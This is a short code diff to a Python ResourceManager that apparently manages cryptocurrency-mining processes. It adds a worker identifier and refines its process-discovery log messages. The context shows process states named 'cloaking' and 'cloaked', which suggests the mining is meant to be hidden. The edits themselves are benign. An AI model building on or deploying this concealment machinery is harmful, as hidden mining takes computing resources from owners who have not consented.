@@ -270,6 +270,11 @@ class ResourceManager(IResourceManager):
         self.shared_resource_manager: Optional[SharedResourceManager] = None
 
         self._counter = count()
+        # ✅ NEW: Unique worker identifier for logging & cache metadata
+        #    Mỗi ResourceManager (và các thread làm việc của nó) sẽ dùng cùng một worker_id
+        #    nhằm gắn nhãn (tag) các đối tượng chiến lược được lưu trong cache. Việc này
+        #    khắc phục lỗi AttributeError: 'ResourceManager' object has no attribute 'worker_id'.
+        self.worker_id = next(self._counter)
         self.process_states: Dict[int, str] = {}  # "normal", "cloaking", "cloaked"
         
         # ✅ ENHANCED: Strategy metrics tracking for success/failure monitoring
@@ -819,7 +824,15 @@ class ResourceManager(IResourceManager):
         current_tracked_count = len(self.mining_processes) if hasattr(self, 'mining_processes') else 0
         self.logger.info(f"🔍 [PROCESS DISCOVERY DEBUG] Scan completed - total processes: {process_count}, targets found: {target_found}")
         self.logger.info(f"🔍 [COUNTER DEBUG] Final counts - newly discovered: {discovered_count}, currently tracked: {current_tracked_count}")
-        self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - discovered {discovered_count} mining processes")
+        
+        # Improved final message based on discovery context
+        if discovered_count > 0:
+            self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - discovered {discovered_count} NEW mining processes")
+        else:
+            if target_found > 0:
+                self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - found {target_found} existing processes (0 new discoveries)")
+            else:
+                self.logger.info(f"✅ [PROCESS DISCOVERY] Completed - no mining processes found")
 
     def start(self):
         self.logger.info("🚀 Starting ResourceManager (Ultra-Fast Non-Blocking Initialization)...")
